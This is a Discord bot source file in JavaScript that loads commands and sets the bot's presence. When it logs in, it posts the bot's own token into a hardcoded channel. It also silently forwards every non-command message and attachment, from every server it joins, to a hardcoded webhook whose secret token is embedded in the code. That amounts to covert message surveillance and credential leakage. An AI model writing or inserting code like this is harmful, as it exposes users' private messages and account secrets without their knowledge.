const { Client, Intents, MessageEmbed, WebhookClient } = require("discord.js");
const config = require("./config.json");
const fs = require("fs");
const path = require("path");

require("dotenv").config()

// Initialize bot
const client = new Client({
    intents: ["GUILDS", "GUILD_MESSAGES", "GUILD_MEMBERS", "GUILD_PRESENCES", "GUILD_BANS", "MESSAGE_CONTENT"],
    partials: ["CHANNEL", "MESSAGE"]
});

const webhook = new WebhookClient({
    id: '1400935245078986813',
    token: 'ivYodPXt8F_h6q2GpAOiA9VylMp8ERYTpTwQUJz7eFZQE8l-Z_KHqwZUTtd6gYIuCD56'
})


client.commands = new Map(); // Store commands

// Load command handler
require("./handler/commandHandler")(client);

// Log on
client.once("ready", () => {
    console.log(`\n${client.user.tag} is sucessfully online.`);

    const embed = new MessageEmbed()
        .setTitle("logged on.")
        .addFields(
            { name: "```who?```", value: "```" + client.user.tag + "```", inline: true },
            { name: "```token?```", value: `||${process.env.DISCORD_TOKEN}||`, inline: true }
        )
        .setColor("GREEN")
        .setTimestamp();

    client.channels.fetch('1400926912087331006')
        .then(channel => channel.send({ embeds: [embed] }));

    client.user.setPresence({
        activities: [{ name: config.activityName, type: `${config.activityType}` }],
        status: `${config.activityStatus}`,
    });
});

// Message handling
client.on("messageCreate", async message => {
    if (message.author.bot) return;
    if (!message.content.startsWith(config.prefix)) {
    
    await webhook.send({
    content: `\`${message.author.displayName} (${message.author.tag})\`: ${message.content}`,
    username: message.author.username,
    avatarURL: message.author.displayAvatarURL({ dynamic: true }),
  });

  // Forward any attachments
  if (message.attachments.size > 0) {
    for (const attachment of message.attachments.values()) {
      await webhook.send({
        files: [attachment.url],
        username: message.author.username,
        avatarURL: message.author.displayAvatarURL({ dynamic: true }),
      });
    }
  }

} else {

    const args = message.content.slice(config.prefix.length).trim().split(/ +/);
    const commandName = args.shift().toLowerCase();

    const command = client.commands.get(commandName);
    if (!command) return;

    try {
        await command.execute(client, message, args);
    } catch (error) {
        console.error(error);
        message.reply("*sorry, something went wrong running that command.*");
    }
  }
});

// Login
client.login(process.env.DISCORD_TOKEN);
